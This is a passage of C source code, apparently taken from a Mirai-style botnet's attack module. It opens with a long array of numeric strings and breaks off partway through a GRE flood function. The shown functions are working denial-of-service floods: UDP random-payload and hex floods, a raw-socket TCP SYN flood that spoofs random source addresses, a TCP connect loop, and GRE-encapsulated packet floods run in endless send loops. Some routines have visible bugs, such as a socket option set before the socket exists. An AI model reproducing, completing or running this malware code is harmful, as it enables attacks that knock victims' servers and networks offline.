223115073","2420554230","1423801776","1438898765","3289434582","848932523","1946052271","1845490564","1392590459","1347631298","1570699184","2580161157","179111285","3591165233","2602826492","1146239911","1617308054","9789808","598262705","3994905737","3644116341","1642050966","3311815198","3224425519","672601696","1212321680","495449369","1526137179","2098239477","3051679752","3208039192","2889831339","4141607592","3679443616","576786401","2067438774","2163511191","2111054833","2902751609","2579411317","1105207310","2480786394","1012483088","4156053324","3462329741","3300709296","345378011","2216640126","3719024780","3471088052","3353195901","2022162246","3773059093","4044600063","246025601","628342986","1096683347","828549197","414179517","2993355615","1435991830","3683279409","412859584","1479264262","3471553395","3994852864","746607240","3994462068","2019167348","3611092313","4068838569","861214137","3352659747","2797032453","2439219386","3111183567","1990863768","4070443518","1021112290","1064298725","3602479719","910577875","3701197420","2053568627","3484884793","4219251748","3928883518","2953913285","905082517","491558093","3913695822","612958828","3805223848","3960402153","821374004","4021125800","1731496319","1817619216","4061802128","2399582219","2193475097","3083294874","1951996458","2605946806","1343866185","739649937","2304983753","86418822","1648535878","1136206964","1354740146","4019936022","487917078","259488205","2729501867","2738199307","3567999068","217960584","2607608948","1428710509","4213766002","43594208","3784054131","3912268154","3922613841","3401500384","2186907011","1828294746","69251431","1790094464","2794736843","467070211","3338709264","3943095527","4031255008","2037129557","3682302939","1982140493","3094372755","2873798236","4070813232","3591622758","4208800056","2516147583","2139010105","2852163885","2056496623","542148328","356770150","402693070","3015753031","3354987639","406522258","3577390918","2300230","738328593","1510143984","3178728515","1758366832","1894731764","3537110676","2850104086","1917863298","1508790982","1708174768","2517269772","3029997823","1881890745","2632469868","3682079818","3659926796","1991665141","3850071670","2439448037","2887047530","640236891","2798863010","1765417164","2820320863","3030381643","1105333577","2341618122","1610739409","2775913694","4062447676","2496939126","1450639563","2763828269","4270912043","702759076","3113510346","2501069873","515238300","607331451","2576069773","1401360729","438155939","3801762013","1040774594","2995153411","2747848102","2444941021","1319611452","661543479","1831893541","2142052451","1355824224","3619752390","1494273482","824754066","3830753963","4109391511","2129049471","284521508","660942484","3649302985","3283779964","1196944432","296549097","2006469446","2022504809","2476462899","443875205","4251634724","675899650","2562654824","3237189076","3696182274","2343598864","3603959767","2212871653","3572480441","680305673","762508757","1963309345","3590528917","2187854326","3120574405","3519429353","3373589643","55373571","4000154517","13804616","4213069614","3984044900","3329290610","3849655996","1977089420","2032923407","2805620662","2440439738","2698032742","15089769","1438332678","428149038","3915505177","2560776510","4287238024","962411326","2097310974","2791732595","3231364953","3379801344","4071344847","867703397","438573995","3852299615","3503510882","1955510528","119651511","2905453954","1371790913","765468357","3994514895","2946795297","3124130467","2683843911","4042246543","682113896","1569399944","3888718896","3482494618","447581478","1541431279","949952113","911164707","552652954","1483404147","378437297","1279576178","1110405910","2982150358","635015035","56852978","2641787843","324727968","3759745795","2283329919","224026346","1093622896","4161125879","3867333935","3661840342","4190384522","3890669522","1375889046","2650325391","47028652","1084966695","3639775672","3080243502","199055729","3398421825","3473542835","3597019174","4260539953","3099265724","1645724796","2908760982","216999775","1130624840","1749694812","3557981409","886640559","355316931","1632779341","1653109062","998086235","2090871056","621816439","3746191549","2532992939","870581221","1410136241","1600284230","472507211","429406035","2839789188","3914761733","3744057653","3193924329","639731938","2535034970","2960105369","3512538442","2981386781","4028064020","793877386","1590906763","1661228714","4216736772","1894039046","3869501450","2059148771","3330880124","1675469426","2502590257","3822260313","3409668596","2983345943","294351506","2034375515","412383155","3481519655","3105187222","3503891747","2346910025","1826911055","2626899764","1405368549","1731132123","2160972921","3801764915","4189622208","2180374796","836862560","3061267209","751169580","179710218","3784784895","3018432519","2539107450","454520847","3436749923","3834170745","3700718576","2680651554","397704827","2569667247","917258243","3207865284","359924677","2667207362","2203561165","1594906121","3684213732","3834352180","475327792","855570710","556901437","1526166105","3439157468","2762744548","3503700024","3392750174","3237577922","1849409010","358738161","91391306","734781898","3042397182","529758504","2532914902","829049203","1748579542","163866387","1370778676","2028977843","394339423","3850377196","3262599332","947809859","894971725","1917933742","2486714030","1384225096","2364434776","2449297306","3188013951","1898591320","931126763","2932459378","1447361285","3564205747","2566488763","479515698","803455138","1964392993","2908110400","3801755192","3425877367","3620317965","4183805666","2253362599","2694835497","4095318302","1277893914","3040189716","1284334412","1922438657","2356802023","1821658418","2137130697","3600667520","215214694","3572357281","792144801","1433953862","4015781769","1226915621","2810201642","2132806320","3833507963","1724189456","2107486135","691209839","2057679710","1710440578","2834884957","3384204666","4066564790","1528109207","518789753","302905641","1851818445","872426973","880914002","4090151341","1277101102","2286367433","1757219240","874571458","972054226","3876315173","3833155464","2525383502","2525653733","2403885319","3314219428","2965792543","2436098641","4250359996","1165650957","306458307","2950527474","211637538","692555482","2561753902","3058018151","2643297314","3318648063","2839279239","4258104929","2782182997","1957643265","591256360","221095755","720235968","1281276757","3260306818","112935897","4135337169","451424765","3469035058","1878700599","1736691692","2026127491","2703610769","3847837683","22187879","2103265417","3905656654","2178081554","2015138626","309710599","2664051471","4253100587","4254134964","609039804","4242029972","3550392552","557851220","1049148823","4139713486","2402435050","3716205652","813638336","1123195750","2477959640","3968790559","2514036342","1216130739","990271060","1765423729","137523512","2697437710","2092359479","2787079912","3483776399","2501703006","4119259951","580680265","1801810010","890751393","4274090196","4196791624","1352839664","2097992055","2118780527","430121836","2247374245","1200542949","3293750323","2102811364","3424352377","3709123699","205148249","1131297032","532327180","63706890","2819953177","1820554148","352598356","3217025736","2046203117","810468172","4171475961","3230435735","2588089807","2658855141","3466024393","111063395","1863598163","4044721113","3978922142","2425752489","3428816063","75569411","1889110984","3985378759","1104391514","280904779","3778689611","1236602586","3682825006","2163815151","144429202","1804814865","3173918405","1254841927","1249550431","1922780383","4261394308","680637368","80668849","3524010966","3807250525","1820405934","956861634","1215814568","2965043228","1473038199","3355198307","4039851762","3932094085","3942575208","2550592936","3959128273","3896510278","248872236","833402714","454632530","3028849595","616908062","558470150","3471482813","253718951","1052970345","776462592","1853292937","509673516","2403714982","1709131466","3764005569","3596677452","1783846794","1496377049","1690446320","3420316852","1767831958","4074215997","3235989615","41726300","2268225437","1751022172","3625852088","413192224","3720516641","1744957088","1109489286","3439134567","253926373","893739472","1808737347","1118150587","684303559","1690408307","854848102","4216037080","1122179734","2413444400","1002136974","2910673828","1291689871","3889664501","2472966293","1109899331","4065871725","2800673689","2158244383","2925453029","4127840364","846415718","3544171931","770629938","3275985866","1025547589","2641887193","2414010047","648868715","2925773919","2346620683","1647936508","2954544435","53487118","4254076098","823181454","3851747217","867494438","3586662932","1707694762","3391152441","3437636989","1571962022","1355608960","1609469285","1107974683","2483767105","3111215515","3311421939","2592754144","1687586005","4180719573","2195380827","163064470","2563566339","3733856288","47527400","513822721","516609048","2551648894","1517137935","3784649721","2386685461","1369474201","4239065266","356060512","4118207261","1864349153","1452996581","1389422962","3832656524","304410043","2666596230","995977134","3172446735","222195620","1104613376","394201348","1842754827","2261745133","2441807488","3650181905","3186572791","3532357997","3869152113","3830889261","423021179","1744151714","1326382431","3005502654","2027081136","3589448752","3998530918","3133392206","2376271151","459679100","1060680601","1079250317","416530671","3893843194","2120863725","3202685036","1135386710","2274965891","445861063","2525451072","4234155021","3131320650","258799638","256255612","402675337","3853817870","1281716949","1101590477","4104232610","3385916234","618674002","3259749676","3094670108","1710361957","4158777736","815474067","2688958141","2929377307","1551509634","3402934926","332508269","4066053490","685638271","2300868723","1676499977","2464382708","1934016808","4060904122","3147842919","3951299502","1443929352","4060126328","1093693335","3022987497","1873418897","686703421","776918655","3354403584","2614016170","3604945978","2598058172","4022299927","1007351978","1781177534","3635327905","882613813","1184586474","3074431799","1174165677","498799139","4186645868","3636959060","440324899","554777838","2232265300","2446383439","2765960418","4139740177","1658851635","2521650552","3932528738","1567492330","3952570933","2841003402","3397072888","870209850","3196278311","2666969073","849892359","3005286218","422957642","390383568","2962648008","3839038469","595989592","822448228","3133355594","1319702696","3276234324","1237495066","191849379","1287495801","1460032572","3619123412","672896429","1727103019","782602405","1718514194","343866856","1063887564","3348171857","2108926378","2857887813","3205699773","2715717265","2859164131","3628485902","4133516414","287698250","491422882","2805340492","1659364086","978945049","4160644614","4250566737","1303767873","3671556073","313161585","3157465397","2597356839","93413404","3813627620","999167819","3370119176","1372115470","3338101573","2965614558","2500986941","3725497479","1592066261","2793983367","3271072368","1258359501","875074814","284751041","1126262092","4258152240","4171856326","317556153","1594630029","1510974694","2378272444","1730345891","436624052","2469993964","95271314","3158064787","2522666221","1913534187","1615710119","2437319703","1269390587","3491351318","1380216976","709671668","1528351924","2407039203","4293399768","173832112","289071074","3437032614","4126608300","2787531523","3546015316","3388401778","1694308211","2999145362","2928634182","1850755833","2865818500","2072506580","2434463762","2332651451","2294259039","4226875826","4077131315","751500228","2379377430","2483708964","1110386656","2546163529","2465206614","2609426298","173047275","2707004897","1874995054","870625181","4024392318","716460299","2724983013","910786849","3998294913","2719546862","450775526","1004725373","57483811","3886204540","1942715217","3904345643","2043368515","2661342994","1556014960","3575192917","2517416312","1281965136","3184517598","3884386162","4132509128","3957958312","1934199444","96565697","570800991","2216086253","3871091845","1837983707","4278541790","1572763356","1303566315","3876696518","2251142410","2484843161","4149177468","2560023662","224728539","3127673360","992413918","2883702998","2042971938","1098555146","2882997584","4273415827","1088008424","558311665","2258499042","1389002932","832489696","1026908240","28024126","1280796781","3109743278","139797122","2376532144","2121246129","420392221","4236699666","3144170737","2128352494","715821205","2449262470","2361520517","1006247545","809354832","1751991499","3341907193","3323599847","2746281033","276645998","1105359002","550048999","4010563666","1724977101","1523647239","2838303320","398449420","712287520","3308509480","146637767","4014152430","3013723160","3379129925","2663047775","3928016034","1283022127","3265426797","3227943613","467037136","3410302656","3813244857","1542280079","4243211314","223742906","3154931760","3880581456","1814605722","1142775631","1143488905","4110974861","601700751","2529886935","3011433591","3006597043","3352991258","2887440017","1082799414","1991128441","4078418358","130938817","3899788120","207426678","2287249037","2441292865","2047859200","3315903832","1323203544","1933818332","825613198","1078756204","4176828112","744190456","3103863114","2645844609","3671768350","2995027746","2303570272","2833823769","333082950","3492676206","2090579273","4073008454","1406907648","309150386","3138041804","2984365955","899898695","3829494485","3201867913","1762471398","2662772628","1519148176","1998891520","2723620507","293428392","2222645946","3632555612","4244297413","1719856909","837531360","607439113","4152175975","2510009784","3967624997","2993379883","912709609","2191936327","2119105809","1329221540","765524900","1392385677","3851113334","1993626935","511010264","3596246309","769213217","4096326456","3855300071","3835342632","3385258028","3368404667","687300919","212378068","3167787540","3001076175","3145924224","837342128","50445679","1200451159","2992370587","1257650965","645314764","416586968","1927963112","92523645","3419632436","1002626437","614389456","1990689676","952727506","1612947913","3272407393","3229661770","4282016681","1890283802","1936164052","3667697174","4017045090","4010896382","2528276117","2760462662","3961484466","4080910233","1547056227","4125254103","1874921462","407954312","2703272788","448024241","949972451","2943625778","762317450","1998201883","3595473751","1546913198","1128956651","1179792253","4004843064","683656311","1188758149","419033175","3674438551","417285024","920867910","1915226368","3177505854","1603005518","825440046","1452411742","875448484","1484245600","584031666","1301355331","3345053381","1244871241","2198546689","2440915019","2098060751","363837394","2466413579","900337890","539767747","1515697328","4231742223","2526338085","1484457502","2582207012","3229371096","3443527405","924065419","2615223413","463269998","565483033","3865291433","4056145151","3029880118","830785724","3179285977","2580250869","3619859651","3923038434","2849899454","471358953","31285275","1991367964","3802161329","1752937813","2606014710","1795015209","4008390035","2719974219","1529249927","3910536619","2873114741","646311371","3513696582","2789938638","1633902223","3872851952","2924606687","2230721019","2667298359","3358767819","3429283397","359010511","4214415747","3789460924","1382891969","3111136566","1601335233","2061344113","3531029567","2757019709","3074058262","1866224112","3130967890","3257060573","2874843442","569905145","4026016693","2890066236","3325370679","3265234401","370657626","515675885","385357315","2480633908","2230457868","3416968536","646538799","3569930006","3362041401","250343496","3083441155","536902708","877524595","3892435333","1945079451","4235705170","4033247977","2930664947","3582210422","511808873","4230019170","2989099184","4185408096","2283682916","1360469871","2131452468","3493348357","2746448839","1812862579","2848684836","1755556895","2791879918","3992448126","176805078","1926316042","2156210240","2323711327","1627042002","2360690985","2949059720","789419541","908243045","3110892803","3739412774","3331603638","3338888472","2752667856","3823581305","4184785098","2584872925","728464598","1990517711","519183742","3302746793","3397035078","224687005","3933078479","2011518746","2156871632","1736311832","2468802577","405377324","590172198","4206139389","3798300984","1231851672","3954341100","253536028","978478140","1858724918","2398919271","795415661","3483425204","2204542340","4239839239","4077249904","3172356621","2040124936","3241458692","3896439911","228505452","4239524667","690168349","3727342126","1632615054","3536912300","3506596658","866779321","3302505799","136375502","3494308765","2451058234","2724832202","1045197255","1697875971","1202015207","1193140688","2953620764","1136167513","2357074169","105457555","2008082283","3198042254","578862114","3659963924","155371347","2836238505","1017633520","4285884933","859384311","1902367119","3354834276","231375020","3640411415","3949942469","1767956665","3555900633","1941521688","3514083664","997273352","2231684887","2948312605","808860476","3182249048","3039310671","1469460300","396867582","2717787489","2315492691","1672102674","3308138475","2385029764","960520101","795979935","681690823","4151577153","1590390312","15744095","3739905316","3510383156","3612771801","2740759365","2236311789","1512558625","2822142932","1590870465","3697819480","4153338860","390016303","1251104195","730403337","378457231","1869800308","3843183212","1439363692","162117793","3968553083","2150916794","1087794254","1457523967","1104870365","2500266126","3231504625","2347715578","24265380","927596621","749623036","3441826247","354329182","1320379784","3298883448","1850291514","1075871428","4222212152","3958262260","4053291637","2689816657","3182927645","2999526665","1739717688","1578920423","487919490","1220044117","598947142","226361331","3014010929","194253096","622292527","3982408789","3338855335","1466348923","4188944077","466997791","3837531156","615711274","4264120614","3535772582","3546415040","91621817","3505568416","14017038","3896992450","3427610808","2010874305","2320489068","906833947","3969693827","2692101054","3515347266","2647015562","2745431115","3192667540","2815753925","3135611725","3113055502","3313434688","3392396043","354076751","715726776","1543175069","3844144643","1066572562","1258008349","4149793661","1896528095","227707769","2622360841","2729925770","2000102766","3884313325","2425934206","2715537833","705017472","2446604398","3060844024","4008801451","528137846","2605447403","3670064851","1412032503","2209626519","1713676713","1855426475","3620156585","1109531886","2924005654","2317317590","2624321337","2805625064","3248900371","861432361","51194474","3005751947","3505954498","2745432469","4251256386","591077522","2578966429","3621401524","1933328512","2291825736","3764877560","279667541","4039210986","2589831689","2278107255","4002413500","1406239398","2566544115","615613193","1501925004","808786088","2328065269","1770220020","3559769511","2308837957","3196296735","1633836095","3573912864","4082911891","1357678112","2610264977","3854791206","2619342477","1107127847","1125097472","881811525","3997616563","2048061588","4062853571","1326294669","2293938154","2793773438","1456370319","2052568517","157985339","4067083471","1423541208","2664898536","271348928","3913819991","1621187572","589012992","855124814","2940840747","3355091196","2837264209","4209183183","2621715309","3847472811","3655485261","1161408621","3145212346","556766281","2082919121","936281572","354683074","4089069613","445077147","816085389","1037153388","3337961684","2280728162","4256093726","3520374359","3271146029","3527560508","1820854453","3858429328","1153068258","3351539104","2722080583","1479163095","2601443033","2701146805","4235255148","3097248148","1596348630","336412355","1154639753","463043720","259162327","724497635","1230710072","379186688","3518415954","2304127036","385930973","3856524939","3069052566","4119420674","1636673347","3732184483","1898656087","3598729825","1310038931","3995812283","2493474012","792165393","2418915853","1780522631","1549179594","4185526003","1810589446","3520896771","2095691017","693000793","734887083","3445252974","2663062937","2242557362","56507537","1323824444","3581797969","3316363815","3024559300","2853223285","2141138669","2098346679","2252331265","2421289182","2155522925","2009876480","1947295044","891049559","1298193386","1385543176","2528092676","1810522125","2978787424","3056380487","1841386984","231652651","3389102784","2126704279","1049250975","2271295378","3028107775","3883842537","1613220273","725906798","2298393143","2549775251","2439555886","569348486","2291485214","3977925743","3685849478","3042209945","1396344043","1715683369","108288399","360132685","551422901","4085802777","3379085389","1698329611","19277585","1589358446","1637572495","2411766583","43250834","47835415","3618797128","4242245545"};
        char *data = LAMP[rand() % (sizeof(LAMP) / sizeof(char *))];

        pkts[i] = calloc(65535, sizeof (char));
        if (dport == 0xffff)
        {
            targs[i].sock_addr.sin_port = rand_next();
        } else {
            targs[i].sock_addr.sin_port = htons(dport);
        }
            if ((fds[i] = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
            {
                #ifdef DEBUG
                printf("Socket Failed To Start!\n");
                #endif
                return; 
            }
            bind_addr.sin_family = AF_INET;
            bind_addr.sin_port = sport;
            bind_addr.sin_addr.s_addr = 0;
            if(bind(fds[i], (struct sockaddr *)&bind_addr, sizeof (struct sockaddr_in)) == -1){ }
        if (targs[i].netmask < 32)
        {
            targs[i].sock_addr.sin_addr.s_addr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
        }

        if (connect(fds[i], (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in)) == -1) {}
     }
        while (TRUE)
        {
         for (i = 0; i < targs_len; i++)
             {
                int size = 1024 + rand() % (1460 - 1024);
                 char *data = pkts[i];
                if (data_rand)
                 rand_str(data, data_len);
                send(fds[i], data, size, MSG_NOSIGNAL);
            }
        }
    }

void attack_udp_hex(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i;
    char **pkts = calloc(targs_len, sizeof (char *));
    int *fds = calloc(targs_len, sizeof (int));
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    uint16_t data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 1458);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    struct sockaddr_in bind_addr = {0};
    if (sport == 0xffff)
    {
        sport = rand_next();
    } 

    else 
    {
        sport = htons(sport);
    }

    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct udphdr *udph;

        char *payload;

        pkts[i] = calloc(65535, sizeof (char));
        if (dport == 0xffff)
            targs[i].sock_addr.sin_port = rand_next();
        else
            targs[i].sock_addr.sin_port = htons(dport);
        if ((fds[i] = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
        {
            return;
        }

        bind_addr.sin_family = AF_INET;
        bind_addr.sin_port = sport;
        bind_addr.sin_addr.s_addr = 0;

        if (bind(fds[i], (struct sockaddr *)&bind_addr, sizeof (struct sockaddr_in)) == -1)
        {

        }
        
        if (targs[i].netmask < 32)
            targs[i].sock_addr.sin_addr.s_addr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));

        if (connect(fds[i], (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in)) == -1)
        {
            
        }
    }
    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {

        char *udp_hex_array[] = {"\x00","\x01","\x02","\x03","\x04","\x05","\x06","\x07","\x08","\x09","\x0a","\x0b","\x0c","\x0d","\x0e","\x0f","\x10","\x11","\x12","\x13","\x14","\x15","\x16","\x17","\x18","\x19","\x1a","\x1b","\x1c","\x1d","\x1e","\x1f","\x20","\x21","\x22","\x23","\x24","\x25","\x26","\x27","\x28","\x29","\x2a","\x2b","\x2c","\x2d","\x2e","\x2f","\x30","\x31","\x32","\x33","\x34","\x35","\x36","\x37","\x38","\x39","\x3a","\x3b","\x3c","\x3d","\x3e","\x3f","\x40","\x41","\x42","\x43","\x44","\x45","\x46","\x47","\x48","\x49","\x4a","\x4b","\x4c","\x4d","\x4e","\x4f","\x50","\x51","\x52","\x53","\x54","\x55","\x56","\x57","\x58","\x59","\x5a","\x5b","\x5c","\x5d","\x5e","\x5f","\x60","\x61","\x62","\x63","\x64","\x65","\x66","\x67","\x68","\x69","\x6a","\x6b","\x6c","\x6d","\x6e","\x6f","\x70","\x71","\x72","\x73","\x74","\x75","\x76","\x77","\x78","\x79","\x7a","\x7b","\x7c","\x7d","\x7e","\x7f","\x80","\x81","\x82","\x83","\x84","\x85","\x86","\x87","\x88","\x89","\x8a","\x8b","\x8c","\x8d","\x8e","\x8f","\x90","\x91","\x92","\x93","\x94","\x95","\x96","\x97","\x98","\x99","\x9a","\x9b","\x9c","\x9d","\x9e","\x9f","\xa0","\xa1","\xa2","\xa3","\xa4","\xa5","\xa6","\xa7","\xa8","\xa9","\xaa","\xab","\xac","\xad","\xae","\xaf","\xb0","\xb1","\xb2","\xb3","\xb4","\xb5","\xb6","\xb7","\xb8","\xb9","\xba","\xbb","\xbc","\xbd","\xbe","\xbf","\xc0","\xc1","\xc2","\xc3","\xc4","\xc5","\xc6","\xc7","\xc8","\xc9","\xca","\xcb","\xcc","\xcd","\xce","\xcf","\xd0","\xd1","\xd2","\xd3","\xd4","\xd5","\xd6","\xd7","\xd8","\xd9","\xda","\xdb","\xdc","\xdd","\xde","\xdf","\xe0","\xe1","\xe2","\xe3","\xe4","\xe5","\xe6","\xe7","\xe8","\xe9","\xea","\xeb","\xec","\xed","\xee","\xef","\xf0","\xf1","\xf2","\xf3","\xf4","\xf5","\xf6","\xf7","\xf8","\xf9","\xfa","\xfb","\xfc","\xfd","\xfe","\xff"};
        char *payload = udp_hex_array[rand() % 256];

            char *my_random_array[] = {"1024","2048","1458","512","256"};

                if(data_rand) {
                    my_random_array[rand () % 5];
                }

            send(fds[i], payload, data_len, MSG_NOSIGNAL);
        }
    }
}

void attack_method_socket(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts) {
    int sock, on = 1, i = 0;
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
   
    struct sockaddr_in servaddr;

    while (TRUE) {
        for (i = 0; i < targs_len; i++) {
            setsockopt(sock, SOL_SOCKET, SO_KEEPALIVE, &on, sizeof(on));
            if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) 
            {
                #ifdef DEBUG
                    printf("[TCPSOCK/DBG] (%d)fd Socket Opened\n", sock);
                #endif
                    return;
            }
        }
        
    servaddr.sin_family = AF_INET;
    servaddr.sin_family = htons(dport);
    servaddr.sin_addr.s_addr = targs[i].addr;
    if (connect(sock, (struct sockaddr *)&servaddr, sizeof(servaddr)) < 0)
    {
        #ifdef DEBUG
                    printf("[TCPSOCK/DBG] (%d)fd Socket Connection\n", sock);
        #endif
        return;
    }
    
    }
}

void attack_method_tcpsyn(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd;
    char **pkts = calloc(targs_len, sizeof (char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, TRUE);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    uint32_t seq = attack_get_opt_int(opts_len, opts, ATK_OPT_SEQRND, 0xffff);
    uint32_t ack = attack_get_opt_int(opts_len, opts, ATK_OPT_ACKRND, 0);
    BOOL urg_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_URG, FALSE);
    BOOL ack_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_ACK, FALSE);
    BOOL psh_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_PSH, FALSE);
    BOOL rst_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_RST, FALSE);
    BOOL syn_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_SYN, TRUE);
    BOOL fin_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_FIN, FALSE);
    uint32_t source_ip = attack_get_opt_ip(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);
    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
        return;
    }
    i = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
    {
        close(fd);
        return;
    }
    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct tcphdr *tcph;
        uint8_t *opts;
        pkts[i] = calloc(128, sizeof (char));
        iph = (struct iphdr *)pkts[i];
        tcph = (struct tcphdr *)(iph + 1);
        opts = (uint8_t *)(tcph + 1);
        iph->version = 4;
        iph->ihl = 5;
        iph->tos = ip_tos;
        iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct tcphdr) + 20);
        iph->id = htons(ip_ident);
        iph->ttl = ip_ttl;
        if (dont_frag)
            iph->frag_off = htons(1 << 14);
        iph->protocol = IPPROTO_TCP;
        iph->saddr = source_ip;
        iph->daddr = targs[i].addr;
        tcph->source = htons(sport);
        tcph->dest = htons(dport);
        tcph->seq = htons(seq);
        tcph->doff = 10;
        tcph->urg = urg_fl;
        tcph->ack = ack_fl;
        tcph->psh = psh_fl;
        tcph->rst = rst_fl;
        tcph->syn = syn_fl;
        tcph->fin = fin_fl;
        *opts++ = PROTO_TCP_OPT_MSS;
        *opts++ = 4;
        *((uint16_t *)opts) = htons(1400 + (rand_next() & 0x0f));
        opts += sizeof (uint16_t);
        *opts++ = PROTO_TCP_OPT_SACK;
        *opts++ = 2;
        *opts++ = PROTO_TCP_OPT_TSVAL;
        *opts++ = 10;
        *((uint32_t *)opts) = rand_next();
        opts += sizeof (uint32_t);
        *((uint32_t *)opts) = 0;
        opts += sizeof (uint32_t);
        *opts++ = 1;
        *opts++ = PROTO_TCP_OPT_WSS;
        *opts++ = 3;
        *opts++ = 6;
    }
    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
            if (targs[i].netmask < 32)
                iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
            if (source_ip == 0xffffffff)
                iph->saddr = rand_next();
            if (ip_ident == 0xffff)
                iph->id = rand_next() & 0xffff;
            if (sport == 0xffff)
                tcph->source = rand_next() & 0xffff;
            if (dport == 0xffff)
                tcph->dest = rand_next() & 0xffff;
            if (seq == 0xffff)
                tcph->seq = rand_next();
            if (ack == 0xffff)
                tcph->ack_seq = rand_next();
            if (urg_fl)
                tcph->urg_ptr = rand_next() & 0xffff;
            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));
            tcph->check = 0;
            tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr) + 20), sizeof (struct tcphdr) + 20);
            targs[i].sock_addr.sin_port = tcph->dest;
            sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct tcphdr) + 20, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
        }
    }
}
void attack_method_greip(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd;
    char **pkts = calloc(targs_len, sizeof (char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, TRUE);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    int data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    BOOL gcip = attack_get_opt_int(opts_len, opts, ATK_OPT_GRE_CONSTIP, FALSE);
    uint32_t source_ip = attack_get_opt_int(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);
    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
        return;
    }
    i = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
    {
        close(fd);
        return;
    }
    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct grehdr *greh;
        struct iphdr *greiph;
        struct udphdr *udph;
        pkts[i] = calloc(1510, sizeof (char *));
        iph = (struct iphdr *)(pkts[i]);
        greh = (struct grehdr *)(iph + 1);
        greiph = (struct iphdr *)(greh + 1);
        udph = (struct udphdr *)(greiph + 1);
        iph->version = 4;
        iph->ihl = 5;
        iph->tos = ip_tos;
        iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct grehdr) + sizeof (struct iphdr) + sizeof (struct udphdr) + data_len);
        iph->id = htons(ip_ident);
        iph->ttl = ip_ttl;
        if (dont_frag)
            iph->frag_off = htons(1 << 14);
        iph->protocol = IPPROTO_GRE;
        iph->saddr = source_ip;
        iph->daddr = targs[i].addr;
        greh->protocol = htons(ETH_P_IP);
        greiph->version = 4;
        greiph->ihl = 5;
        greiph->tos = ip_tos;
        greiph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct udphdr) + data_len);
        greiph->id = htons(~ip_ident);
        greiph->ttl = ip_ttl;
        if (dont_frag)
            greiph->frag_off = htons(1 << 14);
        greiph->protocol = IPPROTO_UDP;
        greiph->saddr = rand_next();
        if (gcip)
            greiph->daddr = iph->daddr;
        else
            greiph->daddr = ~(greiph->saddr - 1024);
        udph->source = htons(sport);
        udph->dest = htons(dport);
        udph->len = htons(sizeof (struct udphdr) + data_len);
    }
    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *pkt = pkts[i];
